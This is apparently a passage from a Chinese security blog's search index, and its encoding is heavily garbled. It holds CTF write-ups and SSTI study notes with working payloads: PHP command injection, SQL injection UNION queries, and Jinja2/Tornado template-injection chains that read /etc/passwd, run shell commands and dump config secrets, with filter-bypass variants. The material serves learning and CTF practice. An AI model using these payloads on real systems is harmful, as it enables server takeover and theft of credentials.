\u0026#34;/bin/2233 \u0026#34; . implode(\u0026#34; \u0026#34;, $args); exec($cmd, $out); for ($i=0; $i\u0026lt;count($out); $i++){ echo($out[$i]); echo(\u0026#39;\u0026lt;br\u0026gt;\u0026#39;); } ?\u0026gt; å¯ä»¥getæ–¹å¼æ¥æ”¶æœ€å¤š3ä¸ªåä¸ºargsçš„å‚æ•°ï¼Œå¯¹æ¯ä¸ªå‚æ•°çš„å€¼è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œæœ€åæ‹¼æ¥åˆ°$cmdåé¢è¢«execæ‰§è¡Œï¼Œç”¨%0aæ¢è¡Œ+æ•°ç»„[]ç»•è¿‡\npayload\nhttps://security.bilibili.com/sec1024/q/pro/eval.php?args[]=1%0a\u0026amp;args[]=ls https://security.bilibili.com/sec1024/q/pro/eval.php?args[]=1%0a\u0026amp;args[]=cat\u0026amp;args[]=passwd 9d3c3014-6c6267e7-086aaee5-1f18452a\nå®‰å…¨æ”»é˜²\u0026ndash;4 https://security.bilibili.com/sec1024/q/ | æç¤º\næ‡‚çš„éƒ½æ‡‚\næœ‰ä¸ªè¯·æ±‚api https://security.bilibili.com/sec1024/q/admin/api/v1/log/listï¼Œæœ¬èƒ½çš„å»fuzzä¸€ä¸‹ï¼Œç»“æœ412äº†â€¦â€¦QAQ\nusernameéƒ¨åˆ†å¯ä»¥sqliï¼Œè¿‡æ»¤äº†ç©ºæ ¼å’Œå•å¼•å·ï¼Œç”¨æ³¨é‡Šå’Œ16è¿›åˆ¶ç»•è¿‡\npayload\n\u0026#34;user_name\u0026#34;: \u0026#34;1/**/union/**/select/**/database(),user(),3,4,5\u0026#34;, \u0026#34;user_name\u0026#34;: \u0026#34;1/**/union/**/select/**/database(),user(),3,4,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()#\u0026#34;, \u0026#34;user_name\u0026#34;: \u0026#34;1/**/union/**/select/**/database(),user(),3,4,group_concat(id)/**/from/**/flag#\u0026#34;, 3d5dd579-0678ef93-18b70cae-cabc5d51\néš¾åº¦åº”è¯¥ç®—æ˜¯åç®€å•çš„ï¼Œå°±æ˜¯ï¼Œemmmmmmmmmm\nç®—äº†ï¼Œæˆ‘ä¸å¥½è¯´\n","date":"2021-11-14T20:15:47+08:00","permalink":"https://amiaaaz.github.io/2021/11/14/bilibili-sec1024-wp/","section":"posts","tags":["wp"],"title":"Bilibili 1024å®‰å…¨æ”»é˜² Wp"},{"categories":["NOTES\u0026SUMMARY"],"contents":"æ¨¡æ¿æ¸²æŸ“å¯ä»¥å€ŸåŠ©ä»£ç æ„é€ ï¼ˆå¦‚æ¡ä»¶ã€å¾ªç¯è¯­å¥ç­‰ï¼‰ååˆ†æ–¹ä¾¿çš„åŠ¨æ€å‘ˆç°å†…å®¹ï¼Œä½†å¦‚æœç¼–å†™ä¸å½“å®¹æ˜“è¢«æ”»å‡»è€…æ³¨å…¥æ¶æ„å†…å®¹ä»è€Œæš´éœ²ä¸Šä¸‹æ–‡æ•°æ®ï¼Œç”šè‡³åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œæ‰§è¡Œä»»æ„å‘½ä»¤çš„è¡¨è¾¾å¼\nJinja Jinja2æ˜¯ä¸€ç§é¢å‘Pythonçš„ç°ä»£å’Œè®¾è®¡å‹å¥½çš„æ¨¡æ¿è¯­è¨€ï¼Œä»¥Djangoçš„æ¨¡æ¿ä¸ºæ¨¡å‹ï¼Œæ˜¯Flaskæ¡†æ¶çš„ä¸€éƒ¨åˆ†\nJinja2 èƒ½è¯†åˆ«æ‰€æœ‰ç±»å‹çš„å˜é‡ï¼Œç”šè‡³æ˜¯ä¸€äº›å¤æ‚çš„ç±»å‹ï¼Œä¾‹å¦‚åˆ—è¡¨ã€å­—å…¸å’Œå¯¹è±¡ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä½¿ç”¨è¿‡æ»¤å™¨ä¿®æ”¹å˜é‡ï¼Œè¿‡æ»¤å™¨åæ·»åŠ åœ¨å˜é‡åä¹‹åï¼Œä¸­é—´ä½¿ç”¨ç«–çº¿åˆ†éš”ï¼ˆè¿™å¾ˆæœ‰åˆ©äºæˆ‘ä»¬æ„é€ æ¶æ„çš„payloadï¼‰ï¼Œæ¯”å¦‚è¿™æ ·çš„æ¨¡æ¿å¯ä»¥ç”¨é¦–å­—æ¯å¤§å†™å½¢å¼æ˜¾ç¤ºå˜é‡nameçš„å€¼\nHello, {{name|capitalize}} Jinjia2ä¹Ÿæ”¯æŒæ§åˆ¶è¯­å¥ï¼Œæ¯”å¦‚è¿™æ˜¯ä¸€ä¸ªå¸¸è§çš„forè¯­å¥çš„æ¸²æŸ“æƒ…å†µ\n\u0026lt;ul\u0026gt; {% for comment in comments %} \u0026lt;li\u0026gt;{{comment}}\u0026lt;/li\u0026gt; {% endfor %} \u0026lt;/ul\u0026gt; ä¹‹æ‰€ä»¥æœ‰æ¨¡æ¿æ¸²æŸ“çš„æ¼æ´æ˜¯å› ä¸ºåœ¨æ¸²æŸ“ä¼ é€’è¿›å»çš„å‚æ•°æ—¶æ¨¡æ¿å¯ä»¥ç›´æ¥è®¿é—®Pythonçš„ä¸€äº›å¯¹è±¡åŠæ–¹æ³•ï¼Œå¯ä»¥æ„é€ ä¸€ä¸ªé•¿é•¿çš„ç»§æ‰¿é“¾æ¥æ‰§è¡Œä¸€äº›æ“ä½œï¼Œæ¯”å¦‚æ–‡ä»¶è¯»å†™\u0026amp;å‘½ä»¤æ‰§è¡Œ\n__dict__ï¼šä¿å­˜ç±»å®ä¾‹æˆ–å¯¹è±¡å®ä¾‹çš„å±æ€§å˜é‡é”®å€¼å¯¹å­—å…¸ __class__ï¼šè¿”å›ä¸€ä¸ªå®ä¾‹æ‰€å±çš„ç±»ï¼›pythonä¸­çš„æ–°å¼ç±»ï¼ˆæ˜¾ç¤ºç»§æ‰¿objectå¯¹è±¡çš„ç±»ï¼‰éƒ½æœ‰ä¸€ä¸ªå±æ€§__classç”¨äºè·å–å½“å‰å®ä¾‹å¯¹åº”çš„ç±» __mro__ï¼šè¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æï¼ˆå³MRO - Method Resolution Orderï¼‰ __bases__ï¼šä»¥å…ƒç»„å½¢å¼è¿”å›ä¸€ä¸ªç±»ç›´æ¥æ‰€ç»§æ‰¿çš„ç±»ï¼ˆå¯ä»¥ç†è§£ä¸ºç›´æ¥çˆ¶ç±»ï¼‰ __base__ï¼šè¿”å›ä¸€ä¸ªç±»ç›´æ¥æ‰€ç»§æ‰¿çš„ç±»ï¼ˆå•ä¸ªï¼‰ï¼ˆç›¸å½“äº__bases__[0]ï¼‰ï¼Œå’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„ __subclasses__ï¼šä»¥åˆ—è¡¨å½¢å¼è¿”å›ç±»çš„æ‰€æœ‰å­˜æ´»å­ç±»çš„å¼•ç”¨ï¼ˆè€Œéå®ä¾‹ï¼‰ï¼›pythonä¸­çš„ç±»éƒ½ç»§æ‰¿è‡ªobjectï¼Œåªè¦è°ƒç”¨objectç±»å¯¹è±¡çš„__subclasses__()æ–¹æ³•å°±å¯ä»¥è·å–æƒ³è¦çš„å­ç±» __init__ï¼šç±»çš„åˆå§‹åŒ–æ–¹æ³• __globals__ï¼šå¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨ï¼Œå¯ä»¥è¿›ä¸€æ­¥è·å–file, osç­‰æ¨¡å— __builtin__\u0026amp;\u0026amp;__builtins__ï¼šè¿”å›ä¸ç”¨å¯¼å…¥æ¨¡å—å¯ä»¥ç›´æ¥è¿è¡Œä¸€äº›å‡½æ•°ï¼Œä¾‹å¦‚int()ï¼Œlist()ç­‰å†…å»ºå‡½æ•°ï¼ŒæŸ¥çœ‹çš„æ–¹æ³•æ˜¯dir(__builtins__)ã€€åœ¨py2ä¸­__builtins__æ¨¡å—æ˜¯è§£é‡Šå™¨è‡ªåŠ¨åˆ›å»ºçš„å¯¹äº__builtin__æ¨¡å—çš„å¼•ç”¨ï¼Œå¹¶é__buitin__æœ¬èº«ï¼ˆåœ¨ä¸»æ¨¡å—ä¸­æ—¶ï¼Œæƒ…å†µç±»ä¼¼æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå˜é‡å¹¶å¯¹å®ƒåšä¸€æ¬¡å¼•ç”¨ä¼ é€’ï¼Œä¸¤è€…æ˜¯ä¸€æ ·çš„ï¼ŒæŒ‡å‘ç›¸åŒï¼›å½“ä¸æ˜¯ä¸»æ¨¡å— è€Œæ˜¯æˆ‘ä»¬åˆ›å»ºçš„ä¸€ä¸ªå¯ä»¥è¢«å¯¼å…¥çš„æ¨¡å—æ—¶ï¼Œ__builtins__å…¶å®æ˜¯å¯¹__builtin__.__dict__æ¨¡å—çš„å¼•ç”¨ï¼‰ åœ¨py3ä¸­__builtin__è¢«å‘½åä¸ºbuiltins å‚è€ƒï¼šæ·±å…¥ç†è§£Pythonä¸­çš„__builtin__å’Œ__builtins__ | __builtins__ ä¸ __builtin__ï¼ˆbuiltinsï¼‰ æ„é€ çš„åŸç† ä¸€è¨€ä»¥è”½ä¹‹ï¼šé€šè¿‡ä¸€ä¸ªé•¿é•¿çš„è°ƒç”¨ç»§æ‰¿é“¾æ¥å°†å†…å»ºçš„å‡½æ•°æˆ–æ¨¡å—æªå‡ºæ¥ç”¨\nstep1 - æ‰¾åˆ°åŸºç±»object é€šè¿‡å­—ç¬¦ä¸²ã€å­—å…¸ã€åˆ—è¡¨ã€å…ƒç»„å’Œå¾ˆç‰¹æ®Šçš„requestæ¥è·å–åŸºç±»objectï¼Œmroå’Œbases[0]å‡å¯ï¼ˆæˆ–è€…æ˜¯base ä¸€æ ·çš„æ•ˆæœï¼Œä¸ä¸€ä¸€åˆ—ä¸¾ï¼‰\n\u0026#39;\u0026#39;.__class__.__mro__[2]\t# py2 \u0026#39;\u0026#39;.__class__.__mro__[1]\t# py3 {}.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] request.__class__.__mro__[1] step2 - è·å¾—â€œèƒ½ç”¨çš„â€å­ç±» ().__class__.__base__.__subclasses__() ä¼šä»¥åˆ—è¡¨å½¢å¼è¿”å›objectåŸºç±»ä¸‹çš„æ‰€æœ‰å­ç±»ï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯å…¶ä¸­å«æœ‰os, file, __builtins__æ¨¡å—çš„å­ç±»ï¼›è¿™é‡Œç»™å‡ºä¸€ä¸ªè„šæœ¬ï¼Œå¯ä»¥å•ç‹¬å¯»æ‰¾ç‰¹å®šå­ç±»ï¼Œä¹Ÿå¯ä»¥æ ¹æ®æƒ³è¦çš„æ¨¡å—æ‰¾åˆ°å¯¹åº”çš„å­ç±»ï¼Œè¿”å›ç´¢å¼•ä½ç½®\n# py2 \u0026amp; py3 subclass = \u0026#34;warnings.WarningMessage\u0026#34; module = \u0026#39;__builtins__\u0026#39; raw = ().__class__.__base__.__subclasses__() for index, value in enumerate(raw): if subclass in str(value): print(\u0026#39;[*] %s - %s\u0026#39; % (str(value), index)) try: if module in value.__init__.__globals__.keys(): print(index, value) except: pass åˆ°è¿™ä¸€æ­¥å¯ä»¥å¾—åˆ°çš„\nåˆ°è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬çš„payloadå·²ç»æ„é€ å¥½ä¸€åŠäº†ï¼ˆä»¥ä¸‹indexå‡æŒ‡æˆ‘ä»¬éœ€è¦çš„subclassçš„ç´¢å¼•ä½ç½®ï¼‰\n().__class__.__base__.__subclasses__()[index] step3 - è°ƒç”¨ç›¸å…³å‡½æ•°è¿›è¡Œrce py2 - file\u0026amp;os\u0026amp;linecache \u0026lt;type 'file'\u0026gt;æ˜¯py2çš„ä¸“å±ï¼Œç›´æ¥å¯ä»¥ç”¨read(), write(), readlines()è¿›è¡Œæ–‡ä»¶è¯»å†™\n().__class__.__base__.__subclasses__()[40](\u0026#39;/etc/passwd\u0026#39;).read() ().__class__.__base__.__subclasses__()[40](\u0026#39;/tmp\u0026#39;).write(\u0026#39;test\u0026#39;) osæ¨¡å—å°±ä¸å¿…è¯´äº†ï¼Œæœ‰system()å¯ä»¥ç›´æ¥rceçš„å‡½æ•°ï¼›åœ¨py2ä¸­è¿™ä¸¤ä¸ªå­ç±»å¯ä»¥ç›´æ¥ç”¨\n# \u0026lt;class \u0026#39;site._Printer\u0026#39;\u0026gt;, 71 # \u0026lt;class \u0026#39;site.Quitter\u0026#39;\u0026gt;, 76 ().__class__.__base__.__subclasses__()[index].__init__.__globals__[\u0026#39;os\u0026#39;].system(\u0026#39;whoami\u0026#39;) {{().__class__.__base__.__subclasses__()[index].__init__.__globals__[\u0026#39;os\u0026#39;].__dict__.environ[\u0026#39;FLAG]}} ä¸å«Œéº»çƒ¦çš„è¿˜å¯ä»¥å†å¥—ä¸€å±‚ï¼Œç”¨linecacheæ¥è°ƒç”¨osï¼Œpy2ä¸­æœ‰è¿™ä¸¤ä¸ªç±»å«æœ‰linecacheæ¨¡å—\n# \u0026lt;class \u0026#39;warnings.WarningMessage\u0026#39;\u0026gt;, 58 # \u0026lt;class \u0026#39;warnings.catch_warnings\u0026#39;, 59 [].__class__.__base__.__subclasses__()[index].__init__.__globals__[\u0026#39;linecache\u0026#39;].__dict__[\u0026#39;os\u0026#39;].__dict__[\u0026#39;system\u0026#39;](\u0026#39;whoami\u0026#39;) py3 - __builtins__ py3ä¸­å°±æ²¡è¿™ä¹ˆç›´æ¥ï¼Œè¦å…³æ³¨çš„æ¨¡å—æ˜¯__builtins__ï¼Œå€ŸåŠ©å®ƒæ¥è°ƒç”¨å†…ç½®çš„open()è¿›è¡Œæ–‡ä»¶è¯»å†™ï¼Œç”¨eval()å°†osæ¨¡å—å¼•å…¥rce\n().__class__.__base__.__subclasses__()[index].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;whoami\u0026#39;)\u0026#34;) ().__class__.__base__.__subclasses__()[index].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;open\u0026#39;](\u0026#39;/etc/passwd\u0026#39;,\u0026#39;r\u0026#39;).read() æˆ–è€…æ˜¯ç›´æ¥ç”¨__import__åŠ è½½osæ¨¡å—æ‰§è¡Œå‘½ä»¤\n().__class__.__base__.__subclasses__()[index].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read() py2æœ‰ä¸ªç‰¹æ®Šçš„commandsæ¨¡å—ä¹Ÿå¯ä»¥ç›´æ¥rce\n().__class__.__base__.__subclasses__()[index].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;__import__\u0026#39;](\u0026#39;commands\u0026#39;).getstatusoutput(\u0026#39;whoami\u0026#39;) â€”â€”â€”â€”â€”â€”æ³¨æ„å¼•ç”¨__builtins__å†…å»ºæ¨¡å—è¿™ä¸€æ–¹å¼åœ¨py2\u0026amp;py3å®Œå…¨é€šæ€\nå¸¸ç”¨payload å…¶å®ä¸Šé¢å·²ç»åˆ—ä¸¾çš„æ¯”è¾ƒå…¨å•¦ï¼Œè¿™é‡Œåšä¸€äº›å°å°çš„è¡¥å……\nforè¯­å¥ç¡®å®šç´¢å¼•ä½ç½® å‰é¢æåˆ°è¿‡ä¸€ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦çš„å­ç±»åœ¨pythonä¸åŒç‰ˆæœ¬ä¸­ä½ç½®å¹¶ä¸å›ºå®šï¼ˆä¸»è¦æ˜¯py3 py2çš„åŸºæœ¬å›ºå®šæ­»äº†ï¼‰ï¼Œé’ˆå¯¹è¿™ä¸ªé—®é¢˜å¯ä»¥ç”¨Jinjaæ”¯æŒçš„forè¯­å¥æ¥è§£å†³ï¼Œsubmoduleçš„åå­—å¯ä»¥ç”¨ä¸Šé¢çš„è„šæœ¬è·‘\n{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;submodule\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;filename\u0026#39;, \u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} {% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;submodule\u0026#39; %}{{c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].eval(\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;id\u0026#39;).read()\u0026#34;) }}{% endif %}{% endfor %} ç‰¹æ®Šçš„ä¸€äº›å¯¹è±¡ {{config}} {{config.items()}} {{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;ls\u0026#39;).read()}} {{get_flashed_messages.__globals__[\u0026#39;current_app\u0026#39;].config}} {{app.__init__.__globals__.sys.modules.app.app.__dict__}} {{url_for.__globals__[\u0026#39;__builtins__\u0026#39;].__import__(\u0026#39;os\u0026#39;).system(\u0026#39;ls\u0026#39;)}} {{url_for.__globals__[\u0026#39;current_app\u0026#39;].config.FLAG}} {{request.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;/etc/passwd\u0026#39;).read()}} {{request.application.__self__._get_data_for_json.__globals__[\u0026#39;json\u0026#39;].JSONEncoder.default.__globals__[\u0026#39;current_app\u0026#39;].config[\u0026#39;FLAG\u0026#39;]}} å„ç§å„æ ·çš„bypass ä¸€èˆ¬éƒ½ä¸ä¼šåªè¿‡æ»¤ä¸€ç§çš„ï¼Œç»¼åˆåº”ç”¨\né’ˆå¯¹å…³é”®å­—çš„è¿‡æ»¤ ä»¥classä¸ºä¾‹ï¼Œåšä¸€ä¸ªå­—ç¬¦ä¸²çš„æ‹¼æ¥\n\u0026#39;cl\u0026#39;~\u0026#39;ass\u0026#39;\t# æ‹¼æ¥ \u0026#34;cl\u0026#34;+\u0026#34;ass\u0026#34; \u0026#39;cla\u0026#39;.join(\u0026#39;ss\u0026#39;)\t# æ‹¼æ¥ \u0026#39;Y2xhc3M=\u0026#39;.decode(\u0026#39;base64\u0026#39;)\t# b64 \u0026#39;\\u0063\\u006C\\u0061\\u0073\\u0073\u0026#39;\t# unicode \u0026#39;\\x63\\x6c\\x61\\x73\\x73\u0026#39;\t# hex è¿‡æ»¤[] []ç”¨åœ¨å­—å…¸æŒ‰ç´¢å¼•å–å€¼å’Œæ•°ç»„ä¸­å–å€¼ï¼Œä¸è¿‡ç¦æ­¢äº†è¿˜æ˜¯æœ‰å‡½æ•°å¯ä»¥ç”¨\n__getitem__\n().__class__.__base__.__subclasses__().__getitem__(index).__init__.__globals__.__getitem__(\u0026#39;__builtins__\u0026#39;).__getitem__(\u0026#39;eval\u0026#39;)(\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls /\u0026#34;).read()\u0026#39;) pop()\n().__class__.__base__.__subclasses__().pop(index).__init__.__globals__.pop(\u0026#39;__builtins__\u0026#39;).pop(\u0026#39;eval\u0026#39;)(\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls /\u0026#34;).read()\u0026#39;) .\n().__class__.__bases__.0.__subclasses__().index.__init__.__globals__.linecache.os.popen(\u0026#39;whoami\u0026#39;).read() è¿‡æ»¤. .ç‚¹å·ç”¨åœ¨å‘ä¸‹ä¸åœåœ°å–å€¼ï¼Œè·Ÿ[]å¾ˆåƒ\n\u0026#34;\u0026#34;.__class__ == \u0026#34;\u0026#34;[\u0026#34;__class__\u0026#34;] attr() å¾ˆå¼ºçš„ä¸€ä¸ªflaskå†…ç½®filterï¼Œfoo|attr(\u0026quot;bar\u0026quot;) == foo.bar\n{{()|attr(\u0026#39;__class__\u0026#39;)|attr(\u0026#39;__base__\u0026#39;)............}} è¿‡æ»¤' chr å…ˆæ‰¾å‡ºchr()çš„ä½ç½®ï¼ˆæ³¨æ„è·‘è„šæœ¬è·‘çš„æ˜¯__builtins__ è¿™ä¸ªå‡½æ•°æ˜¯å†…å»ºçš„ï¼‰ï¼Œç”¨æ¨¡æ¿è¯­å¥ç»™å®ƒèµ‹ä¸ªå€¼ï¼Œç„¶åè°ƒç”¨\n{% set chr=().__class__.__bases__[0].__subclasses__()[index].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}} request.args flaskä¸­å­˜å‚¨è¯·æ±‚å‚æ•°åŠå€¼çš„å­—å…¸ï¼Œå¯ä»¥å°†å€¼å…ˆèµ‹ç»™å®ƒç„¶åè¿›è¡Œè°ƒç”¨\n{{[].__class__.__base__.__subclasses__()[index].__init__.__globals__[request.args.arg1]}}\u0026amp;arg1=os è¿‡æ»¤_ request.args\n{{\u0026#39;\u0026#39;[request.args.class][request.args.base][request.args.subclasses]()[index](\u0026#39;/etc/passwd\u0026#39;).read() }}\u0026amp;class=__class__\u0026amp;base=__base__\u0026amp;subclasses=__subclasses__ è¿™ç§æ–¹å¼å¯ä»¥ç»“åˆgetå’Œpostï¼Œä¸¾ä¾‹-\u0026gt;[CTFshow å‡»å‰‘æ¯]é€šå…³å¤§ä½¬ï¼Œåœ¨ä¸åŒçš„å­—æ®µå¤„å¯¹ä¼ å…¥å‚æ•°çš„é™åˆ¶æ˜¯ä¸åŒçš„\n/edit?a=__init__\u0026amp;b=__globals__\u0026amp;c=__getitem__\u0026amp;d=os\u0026amp;e=popen\u0026amp;f=whoami\u0026amp;g=read POST: name={%25set%20r=request.args%25}\u0026amp;rank=1\u0026amp;speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}\u0026amp;time=2021å¹´11æœˆ11æ—¥ æŒ‰å­—ç¬¦ä¸²çš„æ–¹å¼èµ°ï¼Œä¹Ÿå¯\nè¿‡æ»¤{ {{}} == {% %} è¿‡æ»¤ +æ›¿ä»£ å…¶å®ƒå§¿åŠ¿ çŸ­çŸ­çŸ­ åˆ©ç”¨çš„æ˜¯Flaskä¸­çš„configå¯¹è±¡ï¼Œå®ƒå¯ä»¥å­˜å‚¨ä¸€éƒ¨åˆ†è®¾ç½®é¡¹çš„å†…å®¹ï¼›config.updateæ–¹æ³•å¯ä»¥ç”¨æ¥å­˜å‚¨è®¾ç½®é¡¹ä¸­çš„å˜é‡ï¼Œç”¨æ³•æ˜¯config.update(key=value)\nè¿™é‡Œç”¨ä¸€ä¸ªé¢˜åšä¾‹å­ï¼ŒæŒ‡è·¯-\u0026gt;[Digital Overdose 2021 Autumn CTF madlib]\n***pwn - åŠ«æŒgotè¡¨getshell pwnï¼Œåœ¨å­¦äº†åœ¨å­¦äº†ï¼ŒæŒ‡æ–°å»ºæ–‡ä»¶å¤¹å’Œmdæ–‡æ¡£ğŸ˜…\nå‚è€ƒï¼šPython æ²™ç®±é€ƒé€¸\nTornado Tornadoä¹Ÿæ˜¯ä¸€ç§æ¨¡æ¿ï¼Œå¯ä»¥æ‰§è¡Œç®€å•çš„è¡¨è¾¾å¼å’Œä¼ é€’å˜é‡ï¼Œå½“å‚æ•°å¯æ§æ—¶å¯èƒ½é€ æˆxsså’Œrce\nå†…ç½®å­—å…¸å¯¹è±¡ handler.settings æŒ‡å‘çš„æ˜¯RequestHandler.application.settings\n{{handler.settings}} {{escape(handler.settings[\u0026#34;cookie\u0026#34;])}} æŸ¥çœ‹å…¨å±€å˜é‡\n{{globals}} æ‰§è¡Œä»£ç  tornadoæ”¯æŒä¸‰ç§sstiæ ‡ç­¾\n{{xxx}}\tå¯æ‰§è¡Œä»»æ„pyä»£ç å’Œtornadoå†…ç½®å¯¹è±¡ {%xxx%}\tä¸‹é¢å±•å¼€è¯´ {#xxx#}\tä½œä¸ºæ³¨é‡Š å†…éƒ¨è¯­å¥ä¸æ‰§è¡Œ {%%}ä¸­çš„è¯­å¥æ”¶åˆ°é™åˆ¶ï¼Œæ ¼å¼ä¸º{%æ“ä½œå å‚æ•°%}ï¼Œæ“ä½œåæœ‰è¿™äº›\napplyã€autoescapeã€blockã€commentã€extendsã€forã€fromã€ifã€importã€includeã€moduleã€rawã€setã€tryã€whileã€whitespace å…¶ä¸­çš„rawï¼Œå¯ä»¥æ‰§è¡ŒåŸç”Ÿpyä»£ç \n{%raw eval(\u0026#39;3-1\u0026#39;)%} extendså¯ä»¥æ¥æ”¶æ–‡ä»¶è·¯å¾„ä½œä¸ºå‚æ•°æ¥åŒ…å«æ–‡ä»¶ï¼Œå¦‚æœè¯¥æ–‡ä»¶æœ¬èº«å­˜åœ¨æ¶æ„çš„ssti payloadï¼Œé‚£å°†ä¼šè¢«æ‰§è¡Œ\nï¼ˆæ —å­å¯å‚è§ [QWB2021 Quals]æ‰˜çº³å¤šï¼Œç»“åˆäº†sqlæ³¨å…¥+sqlæ–‡ä»¶å†™å…¥\nDjango Djangoæ˜¯ä¸€ä¸ªpythonçš„webæ¡†æ¶ï¼Œç›¸æ¯”flaskæ¯”è¾ƒåºå¤§ä¸€ç‚¹ç‚¹ï¼›pç‰›çš„è¿™ç¯‡æ–‡ç« -\u0026gt;Python æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆDjangoä¸ºä¾‹ï¼‰æŒ‡å‡ºäº†ä¸€ç§åˆ©ç”¨æ€è·¯ï¼Œé€šè¿‡Djangoé»˜è®¤çš„adminçš„modelæ¥è·å–settingså¯¹è±¡ï¼Œè¿›è€Œè·å–æ•°æ®åº“è´¦å·å¯†ç ã€webåŠ å¯†å¯†é’¥ç­‰ä¿¡æ¯\nä¸¤å‘¨ä¹‹å‰åŸºæœ¬æ€»ç»“è¿‡äº†ï¼Œä½†æ˜¯å‰ä¸¤å¤©é‡åˆ°è¦æ„é€ çš„å…·ä½“åœºæ™¯è¿˜æ˜¯æ‰“ä¸ç©¿ï¼Œäºæ˜¯åˆæ‹äº†ä¸€éåˆ©ç”¨çš„æ€è·¯ï¼ŒæŠŠç¬”è®°æ•´ç†å‡ºæ¥äº†\nè¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬å­¦ä¸œè¥¿è¦æ‰å®ï¼Œæ›´æ‰å®ä¸€ç‚¹ï¼Œä¸ç„¶ä¼šå¾ˆè›‹ç–¼\n","date":"2021-11-08T20:59:28+08:00","permalink":"https://amiaaaz.github.io/2021/11/08/ssti-study-notes/","section":"posts","tags":["SSTI"],"title":"SSTIå­¦ä¹ ç¬”è®°"},{"categories":["CTF","LTS"],"contents":"buuojæ–°ä¸Šäº†åŠ å›ºé¢˜è¿™ä¸ªåˆ†ç±»ï¼Œä¹Ÿå°±æ˜¯çº¿ä¸‹awdpä¸­fixçš„éƒ¨åˆ†ï¼Œåªè¦å°†é¶æœºä¸­å­˜åœ¨çš„æ¼æ´ä¿®å¤å¥½å¹¶é€šè¿‡checkçš„æ£€æµ‹å³å¯æ‹¿åˆ°flagï¼›æœ‰ä¸€è¯´ä¸€ï¼Œæ¯”å•çº¯attackæ‹¿flagä¼šç®€å•å¾ˆå¤šï¼ˆé€‚åˆæˆ‘è¿™ç§æ²¸ç‰©web\nä¸‹é¢çš„wpä¼šå…ˆè¯´çº¯ä¿®å¤è§’åº¦ï¼Œå†ä¸²ä¸€ä¸‹æ•´ä½“çš„çŸ¥è¯†ç‚¹ï¼›å› ä¸ºè‡ªå·±æ°´å¹³æœ‰é™ï¼Œæƒ³å°½å¯èƒ½è¯´çš„æ¸…æ¥šä¸€äº›å°±ä¼šæ¯”è¾ƒå•°å—¦ï¼Œè§è°…QAQ\nEzsql FIX 200è¡Œï¼Œå¤ªå…¸äº†ï¼Œå¯¹ä¼ å…¥çš„å‚æ•°å®Œå…¨æ²¡æœ‰æ£€æµ‹ï¼Œæ˜¯ä¸ªç­›å­ï¼›ç”¨é¢„å¤„ç†çš„æ–¹å¼ä¿®ï¼Œåˆå¯ä»¥åˆ†ä¸ºä¸¤ç§å½¢å¼\nmysqlé¢„å¤„ç† å…¶ä¸­201è¡Œçš„ssæŒ‡çš„æ˜¯ç»‘å®šSQLå‚æ•°çš„ç±»å‹ä¸ºstringï¼Œè¿™ä¸€é¡¹å¿…ä¸å¯å°‘è€Œä¸”å¿…é¡»ä¸åé¢çš„å‚æ•°ä¸€ä¸€å¯¹åº”\nPDOé¢„å¤„ç† PDOé¢„å¤„ç†å±äºæ˜¯é€šé˜²äº†ï¼Œèƒ½æœ‰æ•ˆåœ°åº”å¯¹sqliç‰¹åˆ«æ˜¯å †å æ³¨å…¥ï¼Œ208è¡Œçš„è®¾ç½®é¡¹æ„ä¸ºç¦ç”¨æ¨¡æ‹Ÿé¢„å¤„ç†\n[CISCN2021 æ€»å†³èµ›]babypython FIX 